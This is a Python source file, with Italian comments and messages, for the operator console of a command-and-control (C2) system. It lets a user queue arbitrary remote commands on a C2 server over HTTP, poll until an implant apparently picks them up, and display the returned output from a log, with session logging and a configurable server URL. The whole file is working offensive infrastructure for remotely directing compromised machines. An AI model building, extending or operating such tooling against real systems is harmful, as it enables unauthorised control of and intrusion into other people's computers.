import argparse
import requests
import threading
import time
import sys
import os
from datetime import datetime

# ── configurazione ──────────────────────────────────────────────────────────
POLL_INTERVAL = 1.0
PROMPT        = "\033[1;32mc2\033[0m \033[1;34m»\033[0m "
CLIENT_LOG    = "../logs/c2_client.log"
SERVER_LOG    = "../logs/command_output.log"
# ────────────────────────────────────────────────────────────────────────────

SERVER_URL         = ""
waiting_for_output = False
lock               = threading.Lock()


class CommandEntry:
    def __init__(self, handler, usage: str, help: str):
        self.handler = handler
        self.usage   = usage
        self.help    = help


def cmd_help(_args):
    col_w = max(len(e.usage) for e in COMMANDS.values()) + 4
    print(f"\n  \033[1mComandi locali:\033[0m")
    for name, entry in COMMANDS.items():
        pad = col_w - len(entry.usage)
        print(f"    \033[1m{entry.usage}\033[0m{' ' * pad}{entry.help}")
    print(f"\n  Qualsiasi altra cosa viene inviata come comando remoto.\n")
    return True


def cmd_exit(_args):
    log_write("SESSION", "sessione terminata")
    print("\033[1;31mUscita.\033[0m")
    return False


def cmd_server(args):
    global SERVER_URL
    if not args:
        print(f"  server attuale: \033[1;33m{SERVER_URL}\033[0m")
        return True
    new_url = args[0].rstrip("/")
    SERVER_URL = new_url
    log_write("CONFIG", f"server cambiato a {new_url}")
    print(f"  server impostato a \033[1;33m{new_url}\033[0m")
    return True


def cmd_status(_args):
    try:
        resp = requests.get(f"{SERVER_URL}/command", timeout=3)
        pending = resp.text.strip()
        if pending:
            print(f"  comando in attesa: \033[1;33m{pending}\033[0m")
        else:
            print(f"  nessun comando in attesa")
    except requests.RequestException as e:
        print(f"  \033[1;31m[errore: {e}]\033[0m")
    return True


def cmd_log(_args):
    # Stampa le ultime 20 righe del log client
    if not os.path.exists(CLIENT_LOG):
        print("  log non ancora creato")
        return True
    with open(CLIENT_LOG) as f:
        lines = f.readlines()
    print()
    for line in lines[-20:]:
        print(f"  {line}", end="")
    print()
    return True


# ── registro ─────────────────────────────────────────────────────────────────
COMMANDS: dict[str, CommandEntry] = {
    "help":   CommandEntry(cmd_help,   "help",          "mostra questo messaggio"),
    "exit":   CommandEntry(cmd_exit,   "exit",          "chiude la CLI"),
    "quit":   CommandEntry(cmd_exit,   "quit",          "alias di exit"),
    "server": CommandEntry(cmd_server, "server [url]",  "legge o imposta l'URL del server"),
    "status": CommandEntry(cmd_status, "status",        "controlla se c'è un comando in attesa sul server"),
    "log":    CommandEntry(cmd_log,    "log",           "mostra le ultime 20 righe del log client"),
}
# ─────────────────────────────────────────────────────────────────────────────


# ══════════════════════════════════════════════════════════════════════════════
#  Utility
# ══════════════════════════════════════════════════════════════════════════════

def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log_write(entry_type: str, content: str):
    with open(CLIENT_LOG, "a") as f:
        f.write(f"[{timestamp()}] [{entry_type}] {content}\n")


def clear_line():
    sys.stdout.write("\r\033[K")
    sys.stdout.flush()


def print_output(text: str):
    clear_line()
    print(f"\033[1;33m[{timestamp()}]\033[0m {text}")
    sys.stdout.write(PROMPT)
    sys.stdout.flush()


# ══════════════════════════════════════════════════════════════════════════════
#  Polling thread
# ══════════════════════════════════════════════════════════════════════════════

def poll_loop():
    global waiting_for_output

    while True:
        time.sleep(POLL_INTERVAL)

        with lock:
            if not waiting_for_output:
                continue

        try:
            resp = requests.get(f"{SERVER_URL}/command", timeout=3)
            command_pending = resp.text.strip()
        except requests.RequestException as e:
            with lock:
                if waiting_for_output:
                    print_output(f"\033[1;31m[errore di rete: {e}]\033[0m")
                    waiting_for_output = False
            continue

        if not command_pending:
            try:
                if os.path.exists(SERVER_LOG):
                    with open(SERVER_LOG) as f:
                        content = f.read()
                    blocks = [b.strip() for b in content.split("-" * 50) if b.strip()]
                    if blocks:
                        last_block = blocks[-1]
                        clear_line()
                        print(f"\n\033[1;36m┌─ output ───────────────────────────────────────\033[0m")
                        for line in last_block.splitlines():
                            print(f"\033[1;36m│\033[0m {line}")
                        print(f"\033[1;36m└────────────────────────────────────────────────\033[0m")
                        sys.stdout.write(PROMPT)
                        sys.stdout.flush()
                        log_write("OUTPUT", last_block.replace("\n", " | "))
            except Exception as e:
                print_output(f"\033[1;31m[errore lettura log: {e}]\033[0m")

            with lock:
                waiting_for_output = False


# ══════════════════════════════════════════════════════════════════════════════
#  Main loop
# ══════════════════════════════════════════════════════════════════════════════

def send_command(command: str) -> bool:
    try:
        resp = requests.post(
            f"{SERVER_URL}/set_command",
            data={"command": command},
            timeout=3,
        )
        return resp.status_code == 200
    except requests.RequestException as e:
        print(f"\033[1;31m[errore: {e}]\033[0m")
        return False


def main():
    global SERVER_URL, waiting_for_output, CLIENT_LOG

    parser = argparse.ArgumentParser(
        prog="c2_cli",
        description="C2 Command Line Interface",
    )
    parser.add_argument(
        "server",
        nargs="?",
        default=os.environ.get("C2_SERVER", "http://127.0.0.1:80"),
        help="URL del server C2  (default: $C2_SERVER oppure http://127.0.0.1:80)",
    )
    parser.add_argument(
        "--poll", type=float, default=POLL_INTERVAL,
        metavar="SEC",
        help=f"intervallo di polling in secondi (default: {POLL_INTERVAL})",
    )
    parser.add_argument(
        "--log", default=CLIENT_LOG,
        metavar="FILE",
        help=f"percorso del log client (default: {CLIENT_LOG})",
    )
    cli_args = parser.parse_args()

    SERVER_URL    = cli_args.server.rstrip("/")
    poll_interval = cli_args.poll
    CLIENT_LOG    = cli_args.log

    print(f"\033[1;32m╔══════════════════════════════════════╗\033[0m")
    print(f"\033[1;32m║       C2 Command Line Interface      ║\033[0m")
    print(f"\033[1;32m╚══════════════════════════════════════╝\033[0m")
    print(f"  server  : \033[1;33m{SERVER_URL}\033[0m")
    print(f"  log     : \033[1;33m{CLIENT_LOG}\033[0m")
    print(f"  polling : \033[1;33m{poll_interval}s\033[0m")
    print(f"  digita \033[1mhelp\033[0m per i comandi disponibili\n")

    log_write("SESSION", f"sessione avviata, server={SERVER_URL}")

    t = threading.Thread(target=poll_loop, daemon=True)
    t.start()

    while True:
        try:
            sys.stdout.write(PROMPT)
            sys.stdout.flush()
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            cmd_exit([])
            sys.exit(0)

        if not line:
            continue

        # ── dispatch comandi locali ─────────────────────────────────────────
        parts    = line.split()
        cmd_name = parts[0].lower()
        cmd_args = parts[1:]

        if cmd_name in COMMANDS:
            keep_going = COMMANDS[cmd_name].handler(cmd_args)
            if not keep_going:
                sys.exit(0)
            continue

        # ── comando remoto ──────────────────────────────────────────────────
        with lock:
            if waiting_for_output:
                print("  \033[1;31m[attendere l'output del comando precedente]\033[0m")
                continue

        ok = send_command(line)
        if ok:
            print(f"  \033[1;33m[comando inviato, in attesa di output...]\033[0m")
            log_write("COMMAND", line)
            with lock:
                waiting_for_output = True
        else:
            print(f"  \033[1;31m[errore nell'invio del comando]\033[0m")


if __name__ == "__main__":
    main()